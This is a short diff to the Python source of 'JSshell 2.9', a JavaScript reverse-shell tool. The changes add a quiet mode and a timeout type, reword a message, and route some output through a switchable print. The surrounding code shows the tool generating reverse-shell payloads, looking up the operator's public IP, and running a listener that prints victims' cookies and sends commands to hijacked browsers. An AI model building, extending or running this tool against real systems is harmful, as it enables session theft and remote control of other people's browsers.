@@ -30,12 +30,14 @@ parser = argparse.ArgumentParser(description='JSshell 2.9: javascript reverse sh
 parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
 parser.add_argument('-s', help='local sorce address', dest='host', default='')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
-parser.add_argument('-c', help='command to execute after got shell', dest='command', default='')
-parser.add_argument('-w', help='timeout for shell connection', dest='secs', default=0)
+parser.add_argument('-c', help='command to execute after got shell', dest='command', default=str())
+parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
+parser.add_argument('-q', help='quiet mode', dest='quiet', action='store_true')
 
 args = parser.parse_args()
 
 host = format(args.host)
+
 if not len(host):
     host = get('https://api.ipify.org').text
 try:
@@ -46,7 +48,12 @@ try:
 except:
     print('Invalid port %s' % port)
     quit
-    
+
+if args.quiet:
+    uprint = str
+else:
+    uprint = print
+
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
@@ -110,7 +117,7 @@ def shell():
                 try:
                     print(cookie)
                 except:
-                    print('Could not get the cookie because there is no cookie or other reasons')
+                    print('Could not get the cookie because there is no cookie or because of other reasons')
                               
             c.send(form + buffer.encode())
             c.shutdown(socket.SHUT_RDWR)
@@ -138,9 +145,9 @@ def main():
         print("Can't grab 0.0.0.0:%s with bind: %s" % (port, msg))
         quit()
         
-    print(banner)
+    uprint(banner)
     if gene == True:
-        print('%sPayloads:  %s' % (white, payload))
+        uprint('%sPayloads:  %s' % (white, payload))
     
     print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
     
